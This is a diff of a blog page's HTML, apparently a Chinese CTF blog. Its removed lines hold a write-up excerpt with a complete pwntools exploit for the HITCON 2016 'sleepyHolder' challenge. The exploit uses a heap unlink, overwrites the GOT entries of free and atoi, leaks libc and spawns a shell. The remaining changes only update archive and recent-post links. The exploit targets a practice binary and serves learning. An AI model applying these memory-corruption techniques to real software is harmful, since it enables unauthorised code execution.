-<p><img src="https://i0.imgs.ovh/2023/10/31/AKRU3.png" alt="image-20231031180248465"></p>
-<h5 id="主函数菜单那里还有个atoi函数，写上’sh’即可"><a href="#主函数菜单那里还有个atoi函数，写上’sh’即可" class="headerlink" title="主函数菜单那里还有个atoi函数，写上’sh’即可"></a>主函数菜单那里还有个atoi函数，写上’sh’即可</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,)
-p=process(&quot;./sleepyHolder_hitcon_2016&quot;)
-context.log_level=&quot;debug&quot;
-context(arch=&#39;amd64&#39;)
-elf=ELF(&#39;./sleepyHolder_hitcon_2016&#39;)
-libc=ELF(&#39;libc-2.23.so&#39;)
-def add(chose,content):
-    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;What secret do you want to keep?&#39;,str(chose))
-    p.sendafter(&#39;Tell me your secret: &#39;,content)
-
-def dele(index):
-    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;2&#39;)
-    p.sendlineafter(&#39;Which Secret do you want to wipe?&#39;,str(index))
-
-def edit(ch,content):
-    p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;Which Secret do you want to renew?&#39;,str(ch))
-    p.sendafter(&#39;Tell me your secret: &#39;,content)
-
-add(1,&#39;AAAA&#39;) 
-add(2,&#39;BBBB&#39;) 
-
-dele(1)
-add(3,&#39;cccc&#39;) 
-
-dele(1)
-add(1,&#39;aaaa&#39;) 
-
-fd=0x6020d0-0x18
-bk=0x6020d0-0x10
-
-payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20)
-edit(1,payload) #6
-
-dele(2) #7 unlink
-
-
-payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1)
-edit(1,payload)  #8
-
-
-edit(2,p64(0x400760))
-edit(1,p64(0x602020))
-
-dele(2)
-
-#dele(2)
-p.recvuntil(&#39;2. Big secret&#39;)
-puts_addr=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))
-print(hex(puts_addr))
-base=puts_addr-libc.sym[&#39;puts&#39;]
-
-system=base+libc.sym[&#39;system&#39;]
-
-payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1)
-edit(1,payload)
-
-
-edit(2,p64(system))
-
-
-p.sendlineafter(&#39;3. Renew secret\n&#39;,&#39;sh\n&#39;)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/10/30/sleepyHolder-hitcon-2016/"> Read more -->
-          </span>
-        </div>
-
-        
       </div>
       
 
@@ -875,7 +843,7 @@ p.interactive()
   <div class="widget-box">
     <h3 class="widget-title-archive">archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">July 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">March 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">February 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/10/">October 2023</a></li></ul>
     </div>
   </div>
 
@@ -889,23 +857,23 @@ p.interactive()
       <ul>
         
           <li>
+            <a class="recent_posts-list-link" href="/2024/11/03/house-of-force/">200~house_of_force</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/29/pwn2%20short/">(no title)</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/21/overlapping_chunks/">overlapping_chunks</a>
+          </li>
+        
+          <li>
+            <a class="recent_posts-list-link" href="/2024/10/17/heapcreator/">heapcreator</a>
+          </li>
+        
+          <li>
             <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/">解决libc6软件包和libc6-dev不匹配的问题</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/13/glibc/">glibc</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/12/gostack/">gostack</a>
-          </li>
-        
-          <li>
-            <a class="recent_posts-list-link" href="/2024/09/08/pstack/">pstack</a>
           </li>
         
       </ul>
